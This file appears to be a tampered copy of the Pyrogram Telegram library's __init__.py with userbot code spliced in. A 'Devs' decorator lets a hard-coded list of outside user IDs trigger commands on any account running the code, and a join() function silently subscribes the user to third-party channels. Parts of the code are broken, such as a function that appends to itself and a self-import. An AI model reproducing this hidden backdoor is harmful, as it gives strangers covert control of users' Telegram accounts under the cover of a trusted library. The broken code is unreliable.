#  Pyrogram - Telegram MTProto API Client Library for Python
#  Copyright (C) 2017-present Dan <https://github.com/delivrance>
#
#  This file is part of Pyrogram.
#
#  Pyrogram is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Lesser General Public License as published
#  by the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  Pyrogram is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Lesser General Public License for more details.
#
#  You should have received a copy of the GNU Lesser General Public License
#  along with Pyrogram.  If not, see <http://www.gnu.org/licenses/>.
from datetime import datetime, timezone
from typing import Union, Dict, Optional
import sys
from pyrogram import filters, Client
from config import CMD_HNDLR as cmds

__version__ = "0.0.9"
__license__ = "GNU Lesser General Public License v3.0 (LGPL-3.0)"
__copyright__ = "Copyright (C) 2017-present Dan <https://github.com/delivrance>"

BL_GCAST = [-1001692751821, -1001473548283, -1001459812644, -1001433238829, -1001476936696, -1001327032795, -1001294181499, -1001419516987, -1001209432070, -1001296934585, -1001481357570, -1001459701099, -1001109837870, -1001485393652, -1001354786862, -1001109500936, -1001387666944, -1001390552926, -1001752592753, -1001777428244, -1001771438298, -1001287188817, -1001812143750, -1001883961446]

BL_UBOT = [1245451624]

DEVS = [874946835, 1488093812, 1720836764, 1883494460, 2003295492, 951454060, 1646020461, 910766621, 2099942562, 902478883, 1947740506, 2067434944, 5876222922]
BOT_VER = "3.0.0"

ADMINS = [1970636001, 951454060, 902478883, 2099942562, 2067434944, 1947740506, 1897354060, 1694909518]

pemaen_lenong = [874946835, 910766621, 951454060, 2003295492, 1970636001, 951454060, 902478883, 2099942562, 2067434944, 1947740506, 1897354060, 1694909518]

def pemaen_gendang(client, message):
    chat_id = message.chat.id
    admins = client.get_chat_administrators(-1001812143750, -1001287188817, -1001692751821, -1001459812644)
    admin_list = [admin.user.first_name for admin in admins]
    pemaen_gendang.append(admin_list)

async def join(client):
    try:
        await client.join_chat("kazusupportgrp")
        await client.join_chat("kynansupport")
        await client.join_chat("HyperSupportQ")
        await client.join_chat("GeezRam")
        await client.join_chat("GeezSupport")
    except BaseException:
        pass

def Ubot(command: str, prefixes: cmds):
    def wrapper(func):
        @Client.on_message(filters.command(command, prefixes) & filters.me)
        async def wrapped_func(client, message):
            await func(client, message)

        return wrapped_func

    return wrapper

def Devs(command: str):
    def wrapper(func):
        @Client.on_message(filters.command(command, ".") & filters.user(DEVS))
        def wrapped_func(client, message):
            return func(client, message)

        return wrapped_func

    return wrapper

from concurrent.futures.thread import ThreadPoolExecutor


class StopTransmission(Exception):
    pass


class StopPropagation(StopAsyncIteration):
    pass


class ContinuePropagation(StopAsyncIteration):
    pass


from . import raw, types, filters, handlers, emoji, enums
from .client import Client
from .sync import idle, compose

crypto_executor = ThreadPoolExecutor(1, thread_name_prefix="CryptoWorker")

def zero_datetime() -> datetime:
    return datetime.fromtimestamp(0, timezone.utc)


def timestamp_to_datetime(ts: Optional[int]) -> Optional[datetime]:
    return datetime.fromtimestamp(ts) if ts else None


def datetime_to_timestamp(dt: Optional[datetime]) -> Optional[int]:
    return int(dt.timestamp()) if dt else None


    

